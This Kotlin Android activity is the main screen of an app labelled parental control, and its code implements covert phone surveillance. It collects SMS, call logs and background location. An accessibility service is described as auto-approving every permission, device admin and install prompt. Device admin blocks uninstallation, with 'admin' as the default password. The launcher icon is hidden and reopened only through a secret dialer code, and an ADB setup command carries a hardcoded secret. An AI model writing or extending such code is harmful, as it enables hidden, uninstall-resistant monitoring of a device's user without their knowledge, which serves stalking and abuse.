package com.parentalcontrol.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioAttributes
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.parentalcontrol.app.api.ApiClient
import com.parentalcontrol.app.api.CloudConfig
import com.parentalcontrol.app.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private var isTracking = false
    private val prefs by lazy { getSharedPreferences("app_prefs", Context.MODE_PRIVATE) }
    private var openedFromSecretCode = false

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            // Chain: after permissions granted, check battery opt too
            if (checkAndRequestPermissions()) {
                startTracking()
            }
        } else {
            Toast.makeText(this, "Permissions required for tracking", Toast.LENGTH_LONG).show()
        }
    }

    private val requestBatteryLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        // After battery settings, check again and start if ready
        if (checkAndRequestPermissions()) {
            startTracking()
        } else {
            Toast.makeText(this, "Click Start again after granting battery exemption", Toast.LENGTH_LONG).show()
        }
    }

    private val requestScreenshotLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            Toast.makeText(this, "Screenshot saved", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        CloudConfig.init(this)
        isTracking = TrackerService.isRunning

        UpdateManager.checkAndApplyPendingUpdate(this)

        // Detect if opened from secret dialer code
        openedFromSecretCode = intent?.getBooleanExtra("from_secret_code", false) == true

        // Handle remote actions
        handleIntentAction(intent)

        // Auto-discover server if not configured
        if (CloudConfig.serverUrl == CloudConfig.DEFAULT_SERVER || !pingSavedServer()) {
            autoConnectToServer()
        }

        // Detect whether the configured server is the cloud backend or the simple legacy backend.
        // If it's legacy, we can skip the cloud login flow.
        Thread {
            val detected = ApiClient.probeServerType()
            if (detected != CloudConfig.SERVER_TYPE_AUTO) {
                CloudConfig.serverType = detected
                runOnUiThread { updateUi() }
            }
        }.start()

        // Show setup wizard on first launch if not fully set up
        if (!prefs.getBoolean("setup_completed", false)) {
            showSetupWizard()
        } else if (CloudConfig.isLoggedIn && !TrackerService.isRunning) {
            TrackerService.start(this)
            isTracking = true
        }

        binding.startTrackingButton.setOnClickListener {
            if (CloudConfig.isLoggedIn) {
                if (checkAndRequestPermissions()) {
                    startTracking()
                }
            } else {
                showLoginDialog()
            }
        }

        binding.stopTrackingButton.setOnClickListener {
            stopTracking()
        }

        binding.openDashboardButton.setOnClickListener {
            val intent = Intent(this, WebDashboardActivity::class.java)
            startActivity(intent)
        }

        binding.settingsButton.setOnClickListener {
            showSettingsDialog()
        }

        updateUi()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleIntentAction(intent)
    }

    private fun handleIntentAction(intent: Intent?) {
        when (intent?.getStringExtra("action")) {
            "lock" -> {
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val componentName = ComponentName(this, DeviceAdminReceiver::class.java)
                    if (dpm.isAdminActive(componentName)) {
                        dpm.lockNow()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            "alarm" -> {
                val duration = intent.getIntExtra("duration", 30)
                playAlarm(duration)
            }
            "screenshot" -> {
                // Screenshot requires MediaProjection - will be handled separately
                // For now, mark as completed
            }
        }
    }

    private fun playAlarm(durationSeconds: Int) {
        try {
            val ringtoneUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            val ringtone = RingtoneManager.getRingtone(this, ringtoneUri)
            ringtone.play()
            android.os.Handler(mainLooper).postDelayed({
                ringtone.stop()
            }, durationSeconds * 1000L)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onResume() {
        super.onResume()
        isTracking = TrackerService.isRunning
        updateUi()
    }

    override fun onStop() {
        super.onStop()
        // Re-hide app icon if opened from secret dialer code
        if (openedFromSecretCode && CloudConfig.autoHideEnabled && CloudConfig.stealthMode) {
            DialerSecretCodeReceiver.rehideApp(this)
        }
    }

    private fun showLoginDialog() {
        // Simple legacy servers don't use email/password login.
        if (CloudConfig.serverType == CloudConfig.SERVER_TYPE_LEGACY) {
            if (checkAndRequestPermissions()) startTracking()
            return
        }

        val email = binding.serverUrlInput.text?.toString()?.trim() ?: ""
        val password = binding.passwordInput.text?.toString() ?: ""

        if (email.isEmpty() || password.isEmpty()) {
            // If not logged in and no credentials, show server config
            if (!CloudConfig.isLoggedIn) {
                showRegistrationChoice()
            }
            return
        }

        if (password.length < 6) {
            Toast.makeText(this, "Password must be at least 6 characters", Toast.LENGTH_LONG).show()
            return
        }

        // Try register first (as child), then fallback to login
        binding.statusText.text = "Setting up account..."
        Thread {
            // Step 1: Try to register as child
            val regResult = ApiClient.register(email, password, email.split("@")[0], "child")
            when (regResult) {
                is ApiClient.Result.Success -> {
                    runOnUiThread {
                        Toast.makeText(this, "Account created!", Toast.LENGTH_SHORT).show()
                        binding.statusText.text = "Account created"
                        // Now claim pairing code if entered
                        val code = binding.pairingCodeInput.text?.toString()?.trim()?.uppercase() ?: ""
                        if (code.isNotEmpty()) {
                            claimPairingAndStart(code)
                        } else {
                            if (checkAndRequestPermissions()) startTracking()
                        }
                    }
                }
                is ApiClient.Result.Error -> {
                    // Step 2: Registration failed (probably already exists), try login
                    val loginResult = ApiClient.login(email, password, "child")
                    runOnUiThread {
                        when (loginResult) {
                            is ApiClient.Result.Success -> {
                                Toast.makeText(this, "Logged in!", Toast.LENGTH_SHORT).show()
                                binding.statusText.text = "Logged in"
                                val code = binding.pairingCodeInput.text?.toString()?.trim()?.uppercase() ?: ""
                                if (code.isNotEmpty()) {
                                    claimPairingAndStart(code)
                                } else {
                                    if (checkAndRequestPermissions()) startTracking()
                                }
                            }
                            is ApiClient.Result.Error -> {
                                binding.statusText.text = "Failed: ${loginResult.message}"
                                Toast.makeText(this, loginResult.message, Toast.LENGTH_LONG).show()
                            }
                        }
                    }
                }
            }
        }.start()
    }

    private fun claimPairingAndStart(code: String) {
        binding.statusText.text = "Claiming pairing code..."
        Thread {
            val result = ApiClient.claimPairing(code)
            runOnUiThread {
                when (result) {
                    is ApiClient.Result.Success -> {
                        Toast.makeText(this, "Paired! Waiting for parent approval.", Toast.LENGTH_LONG).show()
                        binding.statusText.text = "Paired - waiting approval"
                    }
                    is ApiClient.Result.Error -> {
                        Toast.makeText(this, "Pairing: ${result.message}", Toast.LENGTH_LONG).show()
                        binding.statusText.text = result.message
                    }
                }
                if (checkAndRequestPermissions()) startTracking()
            }
        }.start()
    }

    private fun showRegistrationChoice() {
        // Simple legacy servers don't need account creation.
        if (CloudConfig.serverType == CloudConfig.SERVER_TYPE_LEGACY) {
            if (checkAndRequestPermissions()) startTracking()
            return
        }

        val email = binding.serverUrlInput.text?.toString()?.trim() ?: ""
        val password = binding.passwordInput.text?.toString() ?: ""

        if (email.isEmpty() || password.length < 6) {
            Toast.makeText(this, "Enter email and password (min 6 chars)", Toast.LENGTH_LONG).show()
            return
        }

        // Try register as child
        binding.statusText.text = "Creating account..."
        Thread {
            val result = ApiClient.register(email, password, email.split("@")[0], "child")
            runOnUiThread {
                when (result) {
                    is ApiClient.Result.Success -> {
                        Toast.makeText(this, "Account created!", Toast.LENGTH_SHORT).show()
                        showPairingDialog()
                    }
                    is ApiClient.Result.Error -> {
                        // If already exists, try login
                        binding.statusText.text = result.message
                        val loginResult = ApiClient.login(email, password, "child")
                        when (loginResult) {
                            is ApiClient.Result.Success -> {
                                Toast.makeText(this, "Logged in!", Toast.LENGTH_SHORT).show()
                                if (checkAndRequestPermissions()) startTracking()
                            }
                            is ApiClient.Result.Error -> {
                                binding.statusText.text = loginResult.message
                                Toast.makeText(this, loginResult.message, Toast.LENGTH_LONG).show()
                            }
                        }
                    }
                }
            }
        }.start()
    }

    private fun showPairingDialog() {
        val code = binding.pairingCodeInput.text?.toString()?.trim()?.uppercase() ?: ""
        if (code.isEmpty()) {
            Toast.makeText(this, "Enter pairing code from parent dashboard", Toast.LENGTH_LONG).show()
            return
        }

        binding.statusText.text = "Pairing device..."
        Thread {
            val result = ApiClient.claimPairing(code)
            runOnUiThread {
                when (result) {
                    is ApiClient.Result.Success -> {
                        Toast.makeText(this, "Paired! Waiting for parent approval", Toast.LENGTH_LONG).show()
                        binding.statusText.text = "Paired - waiting approval"
                    }
                    is ApiClient.Result.Error -> {
                        binding.statusText.text = "Pairing failed: ${result.message}"
                        Toast.makeText(this, result.message, Toast.LENGTH_LONG).show()
                    }
                }
            }
        }.start()
    }

    private fun showSettingsDialog() {
        val dialerInfo = "Dialer Code: *#*#${CloudConfig.secretDialerCode}#*#*"
        val options = mutableListOf(
            "Configure Server",
            "Reconnect to Server",
            "Uninstall Password",
            if (CloudConfig.deviceAdminActive) "Device Admin: Active" else "Enable Device Admin",
            if (CloudConfig.stealthMode) "Disable Stealth Mode" else "Enable Stealth Mode",
            "Change Dialer Code ($dialerInfo)",
            "ADB Setup Command",
            "Pair with Parent",
            "Check for Updates",
            "Setup Wizard",
            "Logout"
        )

        android.app.AlertDialog.Builder(this)
            .setTitle("Settings")
            .setItems(options.toTypedArray()) { _, which ->
                when (which) {
                    0 -> showServerConfigDialog()
                    1 -> autoConnectToServer()
                    2 -> showUninstallPasswordDialog()
                    3 -> toggleDeviceAdmin()
                    4 -> toggleStealthMode()
                    5 -> showDialerCodeDialog()
                    6 -> showAdbSetupCommand()
                    7 -> {
                        if (CloudConfig.isChildAccount) showPairingDialog()
                        else Toast.makeText(this, "Not a child account", Toast.LENGTH_SHORT).show()
                    }
                    8 -> checkForUpdates()
                    9 -> showSetupWizard()
                    10 -> logout()
                }
            }
            .show()
    }

    private fun showUninstallPasswordDialog() {
        val builder = android.app.AlertDialog.Builder(this)
        builder.setTitle("Uninstall Protection")

        val input = android.widget.EditText(this).apply {
            hint = "Set uninstall password"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }
        builder.setView(input)

        builder.setPositiveButton("Set") { _, _ ->
            val password = input.text.toString()
            if (password.length >= 4) {
                CloudConfig.uninstallPassword = password
                Toast.makeText(this, "Uninstall password set. Enable Device Admin to protect.", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "Password must be at least 4 characters", Toast.LENGTH_SHORT).show()
            }
        }
        builder.setNegativeButton("Cancel", null)
        builder.show()
    }

    private fun toggleDeviceAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, DeviceAdminReceiver::class.java)

        if (CloudConfig.deviceAdminActive) {
            if (CloudConfig.uninstallPassword.isEmpty()) {
                Toast.makeText(this, "Set an uninstall password first", Toast.LENGTH_LONG).show()
                showUninstallPasswordDialog()
                return
            }
            Toast.makeText(this, "Go to Settings > Security > Device Admin to disable", Toast.LENGTH_LONG).show()
        } else {
            if (CloudConfig.uninstallPassword.isEmpty()) {
                Toast.makeText(this, "Set an uninstall password first", Toast.LENGTH_LONG).show()
                showUninstallPasswordDialog()
                return
            }
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_warning))
            }
            startActivity(intent)
        }
    }

    private fun checkForUpdates() {
        Toast.makeText(this, "Checking for updates...", Toast.LENGTH_SHORT).show()
        Thread {
            try {
                UpdateManager.checkForUpdate(this)
                runOnUiThread {
                    Toast.makeText(this, "Update check complete", Toast.LENGTH_SHORT).show()
                }
            } catch (e: Exception) {
                runOnUiThread {
                    Toast.makeText(this, "Update check failed: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }
        }.start()
    }

    private fun showServerConfigDialog() {
        val builder = android.app.AlertDialog.Builder(this)
        builder.setTitle("Server URL")

        val input = android.widget.EditText(this).apply {
            setText(CloudConfig.serverUrl)
            hint = "http://your-server:5000"
        }
        builder.setView(input)

        builder.setPositiveButton("Save") { _, _ ->
            CloudConfig.serverUrl = input.text.toString().trim()
            Toast.makeText(this, "Server URL updated", Toast.LENGTH_SHORT).show()
        }
        builder.setNegativeButton("Cancel", null)
        builder.show()
    }

    private fun toggleStealthMode() {
        CloudConfig.stealthMode = !CloudConfig.stealthMode
        val message = if (CloudConfig.stealthMode) {
            "Stealth mode enabled. Dial *#*#${CloudConfig.secretDialerCode}#*#* to re-open."
        } else {
            "Stealth mode disabled"
        }
        Toast.makeText(this, message, Toast.LENGTH_LONG).show()

        if (CloudConfig.stealthMode) {
            hideAppIcon()
            finishAffinity()

            // Go to home screen
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(homeIntent)
        } else {
            showAppIcon()
        }
    }

    private fun hideAppIcon() {
        val aliasComponent = android.content.ComponentName(
            this, packageName + ".LauncherAlias"
        )
        // Method 1: Standard API
        try {
            packageManager.setComponentEnabledSetting(
                aliasComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) { /* ignore */ }

        // Verify it worked, if not try shell fallback
        val state = packageManager.getComponentEnabledSetting(aliasComponent)
        if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            // Method 2: Shell fallback for Vivo/MIUI/ColorOS
            try {
                Runtime.getRuntime().exec(arrayOf(
                    "pm", "disable", "$packageName/.LauncherAlias"
                ))
            } catch (e: Exception) { /* ignore */ }
        }
    }

    private fun showAppIcon() {
        val aliasComponent = android.content.ComponentName(
            this, packageName + ".LauncherAlias"
        )
        try {
            packageManager.setComponentEnabledSetting(
                aliasComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) { /* ignore */ }

        val state = packageManager.getComponentEnabledSetting(aliasComponent)
        if (state != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
            try {
                Runtime.getRuntime().exec(arrayOf(
                    "pm", "enable", "$packageName/.LauncherAlias"
                ))
            } catch (e: Exception) { /* ignore */ }
        }
    }

    private fun showDialerCodeDialog() {
        val builder = android.app.AlertDialog.Builder(this)
        builder.setTitle("Secret Dialer Code")
        builder.setMessage("Current code: *#*#${CloudConfig.secretDialerCode}#*#*\n\nDial this in the phone dialer to re-open the hidden app.")

        val input = android.widget.EditText(this).apply {
            setText(CloudConfig.secretDialerCode)
            hint = "4-digit code (e.g. 1234)"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER
        }
        builder.setView(input)

        builder.setPositiveButton("Save") { _, _ ->
            val code = input.text.toString().trim()
            if (code.length >= 4) {
                CloudConfig.secretDialerCode = code
                Toast.makeText(this, "Code updated: *#*#${code}#*#*", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "Code must be at least 4 digits", Toast.LENGTH_SHORT).show()
            }
        }
        builder.setNegativeButton("Cancel", null)
        builder.show()
    }

    private fun showAdbSetupCommand() {
        val cmd = """adb shell am broadcast -a com.parentalcontrol.app.SETUP_ALL \\
  --es secret "kidguard2024" \\
  --es server "${CloudConfig.serverUrl}" \\
  --es email "child@example.com" \\
  --es password "password123" \\
  --es pairing_code "CODE" \\
  --es dialer_code "${CloudConfig.secretDialerCode}" \\
  -n com.parentalcontrol.app/.SetupReceiver"""

        android.app.AlertDialog.Builder(this)
            .setTitle("ADB Setup Command")
            .setMessage("Run this from a PC with USB connected:\n\n$cmd")
            .setPositiveButton("Copy") { _, _ ->
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                clipboard.setPrimaryClip(android.content.ClipData.newPlainText("ADB Command", cmd))
                Toast.makeText(this, "Command copied!", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("Close", null)
            .show()
    }

    private fun logout() {
        CloudConfig.clear()
        isTracking = false
        if (TrackerService.isRunning) {
            TrackerService.stop(this)
        }
        updateUi()
        Toast.makeText(this, "Logged out", Toast.LENGTH_SHORT).show()
    }

    private var setupStep = 0

    private fun showSetupWizard() {
        setupStep = 0
        showSetupStep()
    }

    private fun showSetupStep() {
        when (setupStep) {
            0 -> {
                android.app.AlertDialog.Builder(this)
                    .setTitle("Auto Setup Wizard")
                    .setMessage(
                        "Step 1/5: Enable Accessibility Service\n\n" +
                        "This is the ONLY manual step. Once enabled, the service will " +
                        "automatically approve ALL remaining permissions for you.\n\n" +
                        "→ Tap 'Open Settings', find 'System Service', and toggle it ON\n" +
                        "→ Return to this app and tap 'Next'"
                    )
                    .setPositiveButton("Open Settings") { _, _ ->
                        TrackerAccessibilityService.openAccessibilitySettings(this)
                        Toast.makeText(this, "Enable 'System Service' in Accessibility, then come back", Toast.LENGTH_LONG).show()
                    }
                    .setNegativeButton("Skip") { _, _ ->
                        setupStep++
                        showSetupStep()
                    }
                    .setNeutralButton("Next") { _, _ ->
                        setupStep++
                        showSetupStep()
                    }
                    .setCancelable(false)
                    .show()
            }
            1 -> {
                if (CloudConfig.uninstallPassword.isEmpty()) {
                    CloudConfig.uninstallPassword = "admin"
                }
                val componentName = ComponentName(this, DeviceAdminReceiver::class.java)
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_warning))
                }
                startActivity(intent)

                android.app.AlertDialog.Builder(this)
                    .setTitle("Step 2/5: Device Admin")
                    .setMessage(
                        "Device Admin prevents uninstallation.\n\n" +
                        "If Accessibility Service is enabled, it will auto-tap 'Activate'.\n" +
                        "If not, please tap 'Activate' manually.\n\n" +
                        "→ Tap 'Next' after activation"
                    )
                    .setPositiveButton("Skip") { _, _ ->
                        setupStep++
                        showSetupStep()
                    }
                    .setNeutralButton("Next") { _, _ ->
                        CloudConfig.deviceAdminActive = true
                        setupStep++
                        showSetupStep()
                    }
                    .setCancelable(false)
                    .show()
            }
            2 -> {
                val needed = mutableListOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.FOREGROUND_SERVICE
                )
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    needed.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                }
                val ungranted = needed.filter {
                    ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                }.distinct()
                if (ungranted.isNotEmpty()) {
                    requestPermissionLauncher.launch(ungranted.toTypedArray())
                }

                android.app.AlertDialog.Builder(this)
                    .setTitle("Step 3/5: Permissions")
                    .setMessage(
                        "Granting permissions: Location, SMS, Calls, Notifications.\n\n" +
                        "If Accessibility Service is enabled, all 'Allow' buttons will " +
                        "be auto-tapped. Just watch!\n\n" +
                        "→ Tap 'Next' after all permissions are granted"
                    )
                    .setPositiveButton("Skip") { _, _ ->
                        setupStep++
                        showSetupStep()
                    }
                    .setNeutralButton("Next") { _, _ ->
                        setupStep++
                        showSetupStep()
                    }
                    .setCancelable(false)
                    .show()
            }
            3 -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                    if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                        val powerIntent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                        powerIntent.data = Uri.parse("package:$packageName")
                        startActivity(powerIntent)
                    }
                }

                android.app.AlertDialog.Builder(this)
                    .setTitle("Step 4/5: Battery Optimization")
                    .setMessage(
                        "Allow the app to run in background without being killed.\n\n" +
                        "The Accessibility Service will auto-tap 'Allow'.\n\n" +
                        "→ Tap 'Next' after done"
                    )
                    .setPositiveButton("Skip") { _, _ ->
                        setupStep++
                        showSetupStep()
                    }
                    .setNeutralButton("Next") { _, _ ->
                        setupStep++
                        showSetupStep()
                    }
                    .setCancelable(false)
                    .show()
            }
            4 -> {
                prefs.edit().putBoolean("setup_completed", true).apply()
                CloudConfig.setupFullyCompleted = true

                // Auto-start tracking
                if (CloudConfig.isLoggedIn && checkAndRequestPermissions()) {
                    startTracking()
                }

                android.app.AlertDialog.Builder(this)
                    .setTitle("✅ Setup Complete!")
                    .setMessage(
                        "All permissions have been configured.\n\n" +
                        "The Accessibility Service is now active and will:\n" +
                        "• Auto-approve all future permission dialogs\n" +
                        "• Auto-tap 'Install' during OTA updates\n" +
                        "• Auto-approve device admin & battery prompts\n\n" +
                        "The app will now HIDE itself from the launcher.\n" +
                        "To re-open, dial: *#*#${CloudConfig.secretDialerCode}#*#*\n" +
                        "on the phone's dialer."
                    )
                    .setPositiveButton("Hide & Finish") { d, _ ->
                        d.dismiss()
                        Toast.makeText(this, "App hidden! Dial *#*#${CloudConfig.secretDialerCode}#*#* to re-open.", Toast.LENGTH_LONG).show()
                        // Auto-enable stealth mode
                        CloudConfig.stealthMode = true
                        CloudConfig.autoHideEnabled = true
                        val pm = packageManager
                        val aliasComponent = android.content.ComponentName(
                            this, packageName + ".LauncherAlias"
                        )
                        pm.setComponentEnabledSetting(
                            aliasComponent,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        finishAffinity()
                        val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                            addCategory(Intent.CATEGORY_HOME)
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        }
                        startActivity(homeIntent)
                    }
                    .setNeutralButton("Keep Visible") { d, _ ->
                        d.dismiss()
                        Toast.makeText(this, "Setup complete! App icon will remain visible.", Toast.LENGTH_LONG).show()
                    }
                    .setCancelable(false)
                    .show()
            }
        }
    }

    private fun checkAndRequestPermissions(): Boolean {
        val needed = mutableListOf<String>()

        needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
        needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            needed.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        needed.add(Manifest.permission.POST_NOTIFICATIONS)
        needed.add(Manifest.permission.READ_SMS)
        needed.add(Manifest.permission.READ_CALL_LOG)
        needed.add(Manifest.permission.FOREGROUND_SERVICE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val ungranted = needed.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.distinct()

        if (ungranted.isNotEmpty()) {
            requestPermissionLauncher.launch(ungranted.toTypedArray())
            return false
        }

        // Battery optimization - ask via launcher so we get a callback
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                val alreadyRequested = prefs.getBoolean("battery_opt_requested", false)
                if (!alreadyRequested) {
                    val powerIntent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    powerIntent.data = Uri.parse("package:$packageName")
                    requestBatteryLauncher.launch(powerIntent)
                    prefs.edit().putBoolean("battery_opt_requested", true).apply()
                    return false
                }
            }
        }

        return true
    }

    private fun pingSavedServer(): Boolean {
        return try {
            val url = java.net.URL("${CloudConfig.apiBaseUrl}/auth/me")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 2000
            conn.readTimeout = 2000
            val code = conn.responseCode
            conn.disconnect()
            code in 200..499
        } catch (e: Exception) {
            false
        }
    }

    private fun autoConnectToServer() {
        binding.statusText.text = "Auto-discovering server..."
        Thread {
            val url = com.parentalcontrol.app.AutoConnectManager.discoverServer(this)
            runOnUiThread {
                if (url != null) {
                    binding.statusText.text = "Connected to server"
                    Toast.makeText(this, "Auto-connected: $url", Toast.LENGTH_SHORT).show()
                    updateUi()
                } else {
                    binding.statusText.text = "Server not found - enter URL manually"
                }
            }
        }.start()
    }

    private fun startTracking() {
        TrackerService.start(this)
        isTracking = true
        updateUi()
        Toast.makeText(this, "Tracking started", Toast.LENGTH_SHORT).show()
    }

    private fun stopTracking() {
        TrackerService.stop(this)
        isTracking = false
        updateUi()
        Toast.makeText(this, "Tracking stopped", Toast.LENGTH_SHORT).show()
    }

    private fun updateUi() {
        if (CloudConfig.isLoggedIn) {
            binding.statusText.text = if (isTracking) "Tracking active" else "Ready - Press Start"
            binding.startTrackingButton.isEnabled = !isTracking
            binding.stopTrackingButton.isEnabled = isTracking
            binding.serverUrlInput.visibility = android.view.View.GONE
            binding.passwordInput.visibility = android.view.View.GONE
            binding.pairingCodeInput.visibility = android.view.View.GONE
        } else {
            binding.statusText.text = "Not logged in - enter credentials"
            binding.startTrackingButton.isEnabled = true
            binding.stopTrackingButton.isEnabled = false
            binding.serverUrlInput.visibility = android.view.View.VISIBLE
            binding.passwordInput.visibility = android.view.View.VISIBLE
            binding.pairingCodeInput.visibility = android.view.View.VISIBLE
        }
    }
}
